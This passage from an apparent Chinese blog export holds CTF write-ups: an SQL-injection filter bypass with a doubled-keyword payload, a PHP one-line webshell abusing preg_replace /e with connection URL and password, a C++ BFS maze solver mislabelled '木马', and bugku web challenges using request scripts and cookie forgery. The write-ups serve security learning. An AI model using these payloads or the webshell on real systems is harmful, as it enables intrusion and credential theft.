<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  <span class="comment">//antiinject.php源码</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">antiinject</span><span class="params">($content)</span></span></span><br><span class="line"><span class="function"> </span>&#123; </span><br><span class="line"> 	$keyword=<span class="keyword">array</span>(<span class="string">"select"</span>,<span class="string">"union"</span>,<span class="string">"and"</span>,<span class="string">"from"</span>,<span class="string">' '</span>,<span class="string">"'"</span>,<span class="string">";"</span>,<span class="string">'"'</span>,<span class="string">"char"</span>,<span class="string">"or"</span>,<span class="string">"count"</span>,<span class="string">"master"</span>,<span class="string">"name"</span>,<span class="string">"pass"</span>,<span class="string">"admin"</span>,<span class="string">"+"</span>,<span class="string">"-"</span>,<span class="string">"order"</span>,<span class="string">"="</span>); <span class="comment">//对一些sql注入时用到的关键词进行了过滤</span></span><br><span class="line">     $info=strtolower($content); </span><br><span class="line"> 	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=count($keyword);$i++)</span><br><span class="line"> 	&#123; </span><br><span class="line"> 		$info=str_replace($keyword[$i], <span class="string">''</span>,$info); </span><br><span class="line"> 	&#125; </span><br><span class="line"> <span class="keyword">return</span> $info; </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>大致意思就是</p>
<p>1.判断http请求头中的user-agent参数是否为Xlcteam Browser</p>
<p>2.post参数soid</p>
<p>3.对soid进行过滤后带入sql语句中查询</p>
<p>于是抓包修改user-agent</p>
<p>确定存在注入点</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/4.png" alt></p>
<p>由于之前提示了<strong>admin表结构 create table admin ( id integer, username text, userpass text, )</strong>  </p>
<p>可直接写出查询语句</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">(sselectelect<span class="comment">/**/</span>group<span class="constructor">_concat(<span class="params">userppassass</span>)</span><span class="comment">/**/</span>ffromrom<span class="comment">/**/</span>aadmindmin)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/5.png" alt></p>
<p>ASCII码转字符串结果为： fuckruntu </p>
<p>登录</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/6.png" alt></p>
<p> <strong><a href="http://cms.nuptzj.cn/about.php?file=xlcteam.php" target="_blank" rel="noopener">http://cms.nuptzj.cn/about.php?file=xlcteam.php</a></strong>  查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">$e = $_REQUEST[<span class="string">'www'</span>]; </span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'wtf'</span>] =&gt; <span class="string">'|.*|e'</span>,); </span><br><span class="line">array_walk($arr, $e, <span class="string">''</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看样子是可以用菜刀连接的</p>
<p> 那怎么利用小马呢，数组的value中是|.*|e，这里用到了正则匹配的preg_replace()的一个漏洞：<br>参考<a href="https://www.jb51.net/article/38714.htm" target="_blank" rel="noopener">https://www.jb51.net/article/38714.htm</a><br>简单来说就是正则中/e(这里和|e效果一样) 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。<br>所以我们可以传递preg_replace给www，这样array中的值就是第一个参数，键就是第二个参数，正好可以利用preg_replace的漏洞，然后会执行$_POST[‘wtf’]，就相当于一个一句话马了。<br>用菜刀连接： </p>
<p>url:<a href="http://cms.nuptzj.cn/xlcteam.php?www=preg_replace" target="_blank" rel="noopener">http://cms.nuptzj.cn/xlcteam.php?www=preg_replace</a></p>
<p>密码：wtf</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/7.png" alt></p>
<p><strong>总结：算是一道比较难的题目了，涉及到知识点也很多，还需要多看看！！！</strong></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>php</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>木马</title>
    <url>/2020/03/20/%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="原题"><a href="#原题" class="headerlink" title="原题"></a>原题</h1><p>题目描述</p>
<a id="more"></a>
<p>小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。<br> 小明只能向上下左右四个方向移动。</p>
<p>输入</p>
<p>输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。<br> 每组输入的第一行是两个整数N和M（1&lt;=N,M&lt;=100）。<br> 接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。<br> 字符的含义如下：<br>‘S’：起点<br>‘E’：终点<br>‘-’：空地，可以通过<br>‘#’：障碍，无法通过<br> 输入数据保证有且仅有一个起点和终点。</p>
<p>输出</p>
<p>对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。</p>
<h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code>1
5 5
s-###
-----
##---
E#---
---##</code></pre><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code>9</code></pre><h2 id="解决代码"><a href="#解决代码" class="headerlink" title="解决代码"></a>解决代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> de[<span class="number">100</span>][<span class="number">100</span>];<span class="comment">//计步数组  记录走到这个位置所需的步数 不能走到的位置标记为-1 </span></span><br><span class="line"><span class="keyword">char</span> <span class="built_in">map</span>[<span class="number">100</span>][<span class="number">100</span>];  <span class="comment">//用于存放迷宫地图 </span></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,intP;  <span class="comment">//坐标</span></span><br><span class="line"><span class="keyword">int</span> to[<span class="number">2</span>][<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>&#125;;  <span class="comment">//在当前坐标下能走的四个方向</span></span><br><span class="line"><span class="keyword">int</span> sx,ex,sy,ey;  <span class="comment">//(sx,sy)为起点坐标  （ex,ey）为终点坐标</span></span><br><span class="line"><span class="keyword">int</span> x,y,nx,ny; <span class="comment">//(x,y)为函数中当前位置坐标   （nx,ny)为接下来能到达的坐标 </span></span><br><span class="line"><span class="keyword">int</span> r,l;  <span class="comment">//r为行数 l为列数 </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bfs</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(de,<span class="number">-1</span>,<span class="keyword">sizeof</span>(de));</span><br><span class="line">	<span class="built_in">queue</span>&lt;Pqu;</span><br><span class="line">	qu.push(P(sx,sy));   //将起点坐标放入队头 </span><br><span class="line">	de[sx][sy]=0;</span><br><span class="line">	<span class="keyword">while</span>(!qu.empty()) </span><br><span class="line">	&#123;</span><br><span class="line">		P p=qu.front();   //取出队头坐标 </span><br><span class="line">		qu.pop() ;//删除对头及走过的坐标 </span><br><span class="line">		x=p.first,y=p.second; </span><br><span class="line">		<span class="keyword">if</span>(x==ex&amp;&amp;y==ey) <span class="keyword">break</span>; //到达终点 跳出循环		</span><br><span class="line">	 	<span class="keyword">for</span>(<span class="keyword">int</span> i=0;i&lt;4;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			nx=x+to[0][i];//开始向四个方向移动 </span><br><span class="line">			ny=y+to[1][i];			</span><br><span class="line">				<span class="keyword">if</span>(nx&gt;=<span class="number">0</span>&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=<span class="number">0</span>&amp;&amp;ny&lt;l&amp;&amp;<span class="built_in">map</span>[nx][ny]!=<span class="string">'#'</span>&amp;&amp;de[nx][ny]==<span class="number">-1</span>)</span><br><span class="line">	 <span class="comment">//判断是否越界 以及是否能走  排除走过的路 </span></span><br><span class="line">	 &#123;</span><br><span class="line">	 	 qu.push(P(nx,ny));  <span class="comment">//将能走的坐标放入队列 之后依次删除 </span></span><br><span class="line">						 de[nx][ny]=de[x][y]+<span class="number">1</span>;  <span class="comment">//步数加一 </span></span><br><span class="line">					  &#125; 				  </span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(de[ex][ey]==<span class="number">-1</span>)  <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">//终点的记步数组为-1 及不能到达终点 </span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> de[ex][ey]; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n,i,j;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		<span class="keyword">while</span>(n--)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;r&gt;&gt;l;</span><br><span class="line">			<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;r;i++)&#123;</span><br><span class="line">				<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;l;j++)&#123; </span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;<span class="built_in">map</span>[i][j];</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[i][j]==<span class="string">'S'</span>) <span class="comment">//记录起点坐标 </span></span><br><span class="line">				 &#123;</span><br><span class="line">					sx=i,sy=j;</span><br><span class="line">				 &#125; </span><br><span class="line">				 <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">map</span>[i][j]==<span class="string">'E'</span>)  <span class="comment">//记录终点坐标 </span></span><br><span class="line">				 &#123;</span><br><span class="line">				 	ex=i,ey=j;</span><br><span class="line">				 &#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;bfs()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>bfs</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku刷题记录2</title>
    <url>/2020/09/10/bugku1/</url>
    <content><![CDATA[<h1 id="bugku刷题记录2"><a href="#bugku刷题记录2" class="headerlink" title="bugku刷题记录2"></a>bugku刷题记录2</h1><a id="more"></a>





<h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>打开页面查看源码什么也没有</p>
<p>抓包看了看，惊喜的发现了flag字段</p>
<p><img src="/2020/09/10/bugku1/%E9%80%9F%E5%BA%A61.png" alt></p>
<p>一段base64 解码后为<code>NDQyMDIy</code></p>
<p>提交发现并不对。。。看来另有玄机</p>
<p>多go几次后发现了flag值一直在变，并且有一段提示</p>
<p><code>&lt;!-- OK ,now you have to post the margin what you find --&gt;</code></p>
<p>用post方法提交你所发现的内容，只好使用脚本（不会写）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">"http://120.24.86.145:8002/web6/"</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=r.get(url).headers<span class="comment">#因为flag在消息头里</span></span><br><span class="line"> </span><br><span class="line">mid=base64.b64decode(headers[<span class="string">'flag'</span>])</span><br><span class="line">mid=mid.decode()<span class="comment">#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的</span></span><br><span class="line"> </span><br><span class="line">flag = base64.b64decode(mid.split(<span class="string">':'</span>)[<span class="number">1</span>])<span class="comment">#获得flag:后的值</span></span><br><span class="line">data=&#123;<span class="string">'margin'</span>:flag&#125;</span><br><span class="line"><span class="keyword">print</span> (r.post(url,data).text)<span class="comment">#post方法传上去</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/10/bugku1/headers.png" alt></p>
<h2 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h2><p>注意观察url<code>http://123.206.87.240:8002/web11/index.php?line=2&amp;filename=a2V5cy50eHQ=</code></p>
<p>line=2&amp;filename=a2V5cy50eHQ=</p>
<p><code>a2V5cy50eHQ=</code> 解密是为key.txt   line是行的意思，这里应该是查看key.txt的第line行的代码</p>
<p>这里可以查看<code>index.php</code>源码  index.php的base64值为<code>aW5kZXgucGhw</code></p>
<p><img src="/2020/09/10/bugku1/cookie1.png" alt></p>
<p>改变line的值可以一行一行的查看源码，可以使用脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url1 = <span class="string">"http://123.206.87.240:8002/web11/index.php?line="</span></span><br><span class="line">url2 = <span class="string">"&amp;filename=aW5kZXgucGhw"</span></span><br><span class="line">mysession = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">40</span>):    </span><br><span class="line">    r = mysession.get(url1+str(i)+url2)    </span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line"></span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;       <span class="comment">//看这里</span></span><br><span class="line"></span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line"></span><br><span class="line">$fa = file($file);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p><code>if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;)</code></p>
<p> 这里可以判断cookie必须满足margin=margin才能访问keys.php</p>
<p><img src="/2020/09/10/bugku1/cookie2.png" alt="bp"></p>
<p><img src="/2020/09/10/bugku1/cookie3.png" alt="hackbar"></p>
<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>查看源码提示了</p>
<p><code>&lt;!--1p.html--&gt;</code>     </p>
<p>直接访问1p.html,发现直接跳转到了bugku的主页，先看源码，发现一段编码应该是base64</p>
<p><img src="/2020/09/10/bugku1/never2.png" alt></p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">JTIyJT<span class="symbol">NCaWYlMjglMjElMjRfR0</span>VUJT<span class="attr">VCJTI3</span>aWQlMjcl<span class="symbol">NUQlMjklMEElN0</span>IlMEElMDloZWFkZXIlMjglMjdMb<span class="number">2</span><span class="symbol">NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4</span>aXQlMjglMjkl<span class="name">M0</span>IlMEEl<span class="symbol">N0</span>QlMEElMjRpZCUzRCUy<span class="symbol">NF9</span>HRVQl<span class="symbol">NUIlMjdpZCUyNyU1</span>RCUzQiUwQSUy<span class="symbol">NGElM0</span>QlMjRfR<span class="number">0</span>VUJT<span class="attr">VCJTI3</span>YSUy<span class="symbol">NyU1</span>RCUzQiUwQSUy<span class="symbol">NGIlM0</span>QlMjRfR<span class="number">0</span>VUJT<span class="attr">VCJTI3</span>YiUy<span class="symbol">NyU1</span>RCUzQiUwQWlmJTI<span class="number">4</span>c<span class="number">3</span>RyaXB<span class="attr">vcyUyOCUyNGElMkMlMjcuJTI3</span>JTI<span class="number">5</span>JTI<span class="number">5</span>JTBBJTdCJTBBJTA<span class="number">5</span>ZW<span class="symbol">NobyUyMCUyN25</span>vJTIwb<span class="name">m8</span>lMjBubyUyM<span class="name">G5</span>vJTIwb<span class="name">m8</span>lMjBubyUyM<span class="name">G5</span>vJTI<span class="number">3</span>JT<span class="symbol">NCJTBBJTA5</span>cmV<span class="number">0</span>dXJuJTIwJT<span class="symbol">NCJTBBJTdEJTBBJTI0</span>ZGF<span class="number">0</span>YSUyMCUzRCUyMEBmaWxlX<span class="number">2</span>dldF<span class="number">9</span>jb<span class="number">250</span>ZW<span class="number">50</span>cyUyOCUy<span class="symbol">NGElMkMlMjdyJTI3</span>JTI<span class="number">5</span>JT<span class="symbol">NCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3</span>UlMjBpcyUyMGElMjBuaW<span class="symbol">NlJTIwcGxhdGVmb3</span>JtJTIxJTIyJTIwYW<span class="number">5</span>kJTIwJTI<span class="number">0</span>aWQl<span class="name">M0</span>Ql<span class="name">M0</span>QwJTIwYW<span class="number">5</span>kJTIwc<span class="number">3</span>RybGVuJTI<span class="number">4</span>JTI<span class="number">0</span>YiUyOSUzRTUlMjBhbmQlMjBlcmV<span class="symbol">naSUyOCUyMjExMSUyMi5</span>zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE<span class="number">0</span>JTIyJTI<span class="number">5</span>JTIwYW<span class="number">5</span>kJTIwc<span class="number">3</span>Vic<span class="number">3</span>RyJTI<span class="number">4</span>JTI<span class="number">0</span>YiUyQzAlMkMxJTI<span class="number">5</span>JTIxJT<span class="symbol">NENCUyOSUwQSU3</span>QiUwQSUwOXJlcXVpcmUlMjglMjJm<span class="symbol">NGwyYTNnLnR4</span>dCUyMiUyOSUzQiUwQSU<span class="number">3</span>RCUwQW<span class="attr">Vsc2</span>UlMEEl<span class="symbol">N0</span>IlMEElMDlwcmludCUyMCUyM<span class="name">m5</span>ldmVyJTIwbmV<span class="number">2</span>ZXIlMjBuZXZlciUyMGdpdmUlMjB<span class="number">1</span>cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU<span class="number">3</span>RCUwQSUwQSUwQSUzRiUzRQ</span><br></pre></td></tr></table></figure>

<p>base64解码后为url编码</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">![never1](E:\myblog\szyblog\source\_posts\bugku1\never1.png)%<span class="number">22</span>%<span class="number">3</span>Bif%<span class="number">28</span>%<span class="number">21</span>%<span class="number">24</span>_GET%<span class="number">5</span>B%<span class="number">27</span>id%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">0</span>A%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">09</span>header%<span class="number">28</span>%<span class="number">27</span>Location%<span class="number">3</span>A%<span class="number">20</span>hello.php%<span class="number">3</span>Fid%<span class="number">3</span>D1%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">09</span>exit%<span class="number">28</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">24</span>id%<span class="number">3</span>D%<span class="number">24</span>_GET%<span class="number">5</span>B%<span class="number">27</span>id%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>a%<span class="number">3</span>D%<span class="number">24</span>_GET%<span class="number">5</span>B%<span class="number">27</span>a%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>b%<span class="number">3</span>D%<span class="number">24</span>_GET%<span class="number">5</span>B%<span class="number">27</span>b%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">0</span>Aif%<span class="number">28</span>stripos%<span class="number">28</span>%<span class="number">24</span>a%<span class="number">2</span>C%<span class="number">27.</span>%<span class="number">27</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">0</span>A%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">09</span>echo%<span class="number">20</span>%<span class="number">27</span>no%<span class="number">20</span>no%<span class="number">20</span>no%<span class="number">20</span>no%<span class="number">20</span>no%<span class="number">20</span>no%<span class="number">20</span>no%<span class="number">27</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">09</span><span class="keyword">return</span>%<span class="number">20</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">24</span>data%<span class="number">20</span>%<span class="number">3</span>D%<span class="symbol">20@</span>file_get_contents%<span class="number">28</span>%<span class="number">24</span>a%<span class="number">2</span>C%<span class="number">27</span>r%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">0</span>Aif%<span class="number">28</span>%<span class="number">24</span>data%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">22</span>bugku%<span class="number">20</span><span class="keyword">is</span>%<span class="number">20</span>a%<span class="number">20</span>nice%<span class="number">20</span>plateform%<span class="number">21</span>%<span class="number">22</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>%<span class="number">24</span>id%<span class="number">3</span>D%<span class="number">3</span>D0%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>strlen%<span class="number">28</span>%<span class="number">24</span>b%<span class="number">29</span>%<span class="number">3E5</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>eregi%<span class="number">28</span>%<span class="number">22111</span>%<span class="number">22.</span>substr%<span class="number">28</span>%<span class="number">24</span>b%<span class="number">2</span>C0%<span class="number">2</span>C1%<span class="number">29</span>%<span class="number">2</span>C%<span class="number">221114</span>%<span class="number">22</span>%<span class="number">29</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>substr%<span class="number">28</span>%<span class="number">24</span>b%<span class="number">2</span>C0%<span class="number">2</span>C1%<span class="number">29</span>%<span class="number">21</span>%<span class="number">3</span>D4%<span class="number">29</span>%<span class="number">0</span>A%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">09</span>require%<span class="number">28</span>%<span class="number">22f</span>4l2a3g.txt%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>Aelse%<span class="number">0</span>A%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">09</span>print%<span class="number">20</span>%<span class="number">22</span>never%<span class="number">20</span>never%<span class="number">20</span>never%<span class="number">20</span>give%<span class="number">20</span>up%<span class="number">20</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>F%<span class="number">3</span>E</span><br></pre></td></tr></table></figure>

<p>url解码为源码</p>
<p><img src="/2020/09/10/bugku1/never1.png" alt></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">f(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">'Location: hello.php?id=1'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'no no no no no no no'</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"bugku is a nice plateform!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">"f4l2a3g.txt"</span>); <span class="comment">//注意这里，flag应该藏在这里</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"never never never give up !!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>果然藏在f4l2a3g.txt</p>
<p><img src="/2020/09/10/bugku1/never.png" alt></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>脚本</tag>
        <tag>cookie</tag>
        <tag>编码</tag>
      </tags>
  </entry>
</search>
